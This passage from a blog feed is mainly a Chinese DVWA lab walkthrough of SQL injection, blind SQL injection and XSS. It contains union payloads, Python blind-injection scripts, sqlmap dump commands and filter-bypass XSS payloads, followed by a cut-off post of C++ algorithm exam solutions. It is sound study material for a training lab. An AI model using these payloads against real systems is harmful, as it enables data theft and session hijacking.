这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 &#39;被 \\转义了，可以使用十六进制绕过 分析源码 &lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125; // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt; mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。 所以导致了单引号被转义的结果 sqlmap注入因为是post注入，所以需要抓取数据包保存下来。 如图，可以将其保存在sqlmap.py的路径下 注入过程python2 .\\sqlmap.py -r .\\a.txt --batch --dbs python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa --tables python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag --columns python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag -C fl4g --dump high这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击 注入直接使用low级别的payload： 1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 1&#x27; union select 1,group_concat(fl4g) from flag # 源码分析 &lt;?php if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; 存在注入的语句只是在low级别的基础上加上了Limit限制了回显的行数，但是使用low级别的注入语句时会直接把Limit 1注释掉，所以完全与low级别一样。 SQL Injection (Blind)盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。 low手工加脚本查询成功返回的语句：User ID exists in the database. 查询失败返回的语句：User ID is MISSING from the database. 这样就可以利用提示信息确定，我们所查询的语句是否正确 首先确定盲注的语句 通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。 1&#x27; and ascii(substring(database(),1,1))&gt;50 # 提示 ：User ID exists in the database. 1&#x27; and ascii(substring(database(),1,1))&lt;50 # 提示： User ID is MISSING from the database. # -*- coding = utf - 8 -*- #@Time : 2020/10/26 17:29 #@Author : sunzy #@File : dvwa.py # 二分法盲注 import requests url = &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot; header = &#123;&quot;Cookie&quot;: &quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;&#125; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #获取数据库名 #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #获取表名 #payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #获取列名 #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #获取flag payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) url1 =url+payload+&quot;&amp;Submit=Submit#&quot; response = requests.post(url1,headers= header) if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) 1.首先获取表名 使用payload: payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 2.获取列名 使用payload payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 3.获取flag 使用payload payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump --batch medium手工加脚本与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。 id=1 and length(database())=4 #&amp;Submit=Submit 提示User ID exists in the database. id=1 and length(database())=5 #&amp;Submit=Submit User ID is MISSING from the database 所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型 直接上脚本 import requests url = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; header = &#123;&quot;Cookie&quot;: &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) data = &#123;&#x27;id&#x27;: payload, &#x27;Submit&#x27;: &#x27;Submit&#x27;&#125; response = requests.post(url,headers = header,data=data) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去 下面是sqlmap爆出的flag。 源码分析 &lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close(); &#125; ?&gt; mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, \\, &#39;, &quot; 和 \\x1a. 本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样 highGET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1 Host: 10.5.8.66 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://10.5.8.66/dvwa/vulnerabilities/sqli/ Connection: close Cookie: id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 抓包后可以发现提交的参数id在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。 手工加脚本通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置 import requests url = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; t=&quot;&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) id = payload header = &#123;&quot;Cookie&quot;: &quot;id=&quot;+payload+&quot;;&quot;+&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; #print(header) response = requests.post(url,headers = header) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) #print(t) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 --dbs --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa --tables --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag --columns --batch python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag -C fl4g --dump --batch sql注入防御通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。 &lt;?php if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; //检测提交的数据是否为数字类型 // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );//预编译绑定了id变量 $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; XSS (Reflected)low&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;; &#125; ?&gt; 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。 先测试一下 &lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; 获取cookie &lt;script&gt;alert(document.cookie);&lt;/script&gt; medium&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 代码审计后可以发现是对输入的内容进行了过滤，将&lt;script&gt;替换为空，可以双写绕过，也可以大小写绕过。 构造payload： &lt;sCriPt&gt;alert(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; //使用其他标签 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 先代码审计，执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 构造payload： &lt;IMG src=1 onerror=alert(document.cookie)&gt; XSS (Stored)low&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 分析 isset() 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim() 函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes() 函数用于删除字符串中的反斜杠 mysqli_real_escape_string() 函数会对字符串中的特殊号(\\x00，\\n，\\r，\\，&#39;，&quot;，\\x1a) 进行转义 在代码中对message，name输入框内容 没有进行XSS方面的过滤和检查 且通过 query 语句插入到数据库中。所以存在存储型XSS漏洞 这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改 由于是存储型XSS,所以每次刷新页面都会弹出cookie。 medium&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 分析$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码 但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS，与反射型中级的一样的方法 payload 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 分析$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 name,执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 只能换一个标签 &lt;IMG src=1 onerror=alert(document.cookie)&gt;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"blind sql","slug":"blind-sql","permalink":"https://sunzhengyu99.github.io/tags/blind-sql/"}]},{"title":"算法上机复习","date":"2020-11-04T13:21:42.000Z","path":"2020/11/04/算法上机复习/","text":"最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了) 16级题目问题 A: 星空梦想——鲁班题目描述鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。 既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？ 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。 接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。 样例输入3 3 4 50 样例输出3 5 20365011074 提示注意结果超过int范围，请用long long类型存储ans #include&lt;bits/stdc++.h&gt; using namespace std; const int N=50; long long f[N]; int main() &#123; f[0]=1,f[1]=1; for(int i=2;i&lt;=50;i++) &#123; f[i]=f[i-1]+f[i-2]; &#125; int n; cin&gt;&gt;n; while(n--) &#123; int m; cin&gt;&gt;m; cout&lt;&lt;f[m]&lt;&lt;endl; &#125; return 0; &#125; 问题 B: 午夜歌剧——元歌题目描述元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。 是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。 等式1： 等式2： 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。 样例输入3 7 143 3223193224 样例输出10 151 163311433223 提示测试数据均大于等于1，不用特判0 感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。 #include&lt;bits/stdc++.h&gt; using namespace std; int t,m; void convert(int n) &#123; int c,r; r=n%7; c=n/7; if(c&gt;0) &#123; convert(c); cout&lt;&lt;r; &#125; else cout&lt;&lt;n; &#125; int main() &#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m; convert(m); cout&lt;&lt;endl; &#125; return 0; &#125; 问题 C: 圣诞恋歌——貂蝉题目描述貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。 输入多组测试数据，第一行输入包含一个整数T，代表测试样例个数。接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。 样例输入6 1 2 3 45 81 样例输出1 2 4 57 121 提示这题就是汽水瓶的改编。。。 #include&lt;bits/stdc++.h&gt; using namespace std; int main() &#123; int n; cin&gt;&gt;n; while(n--) &#123; int m,sum; cin&gt;&gt;m; sum=0; while(m&gt;3) &#123; m=m-2; sum=sum+3; &#125; if(m==3) sum+=4; else sum=m; 